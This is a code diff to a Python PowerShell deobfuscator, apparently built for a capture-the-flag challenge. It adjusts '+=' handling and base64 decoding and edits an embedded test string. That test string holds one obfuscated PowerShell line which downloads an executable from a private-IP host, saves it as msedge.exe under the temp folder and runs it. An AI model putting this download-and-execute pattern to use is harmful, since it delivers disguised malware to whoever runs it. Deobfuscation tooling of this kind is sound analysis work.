@@ -94,6 +94,10 @@ def concat_code(code):
             if "\n" not in check[i]:
                 newcoderes.append('=')
         else:
+            parts = check[i].split('+=')
+            if "+" in parts[1]:
+                newparts = check_symbols(parts[1])
+            check[i] = parts[0] + "+=" + newparts
             newcoderes.append(check[i])
     newcode = ''.join([i for i in newcoderes])
     newcode = newcode.replace('"', "").replace("'", "")
@@ -125,11 +129,9 @@ def decoding(code):
             encoded = unquote(match.group(1))
             decoded = base64.b64decode(encoded).decode()
             code = code.replace(match.group(0), decoded)
-            return code
         except:
             return code
-    else:
-        return code
+    return code
 
 def replace_multiple_variables(code):
     pattern = r'(\$\w+|\b\w+)\s*=\s*(\S+(\s*=\s*\S+)*)'
@@ -188,9 +190,10 @@ $tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4)
 $tes4 = '[ChaR](99+               13)   +   [CHar](109 -bxor 4)'
 $tes5 = $tessss = ReplAce('hel'+ ([ChaR](99   +  10) +  [Char](-10   +   100))   +"lo",[ChaR](99+               10)   '+'   [CHar](109 -bxor 4))
 $u='ht'+'tp://192.168.0.16:8282/B64_deC'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
+$tes += '[ChaR](99+               10)   +   [CHar](109 -bxor 4)'
 $tes6 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
 $tes7 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
-$tes2 += pe
+$tes2 += [ChaR](98   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
 """
 # deobfuscate(testing)
 print(deobfuscate(testing))
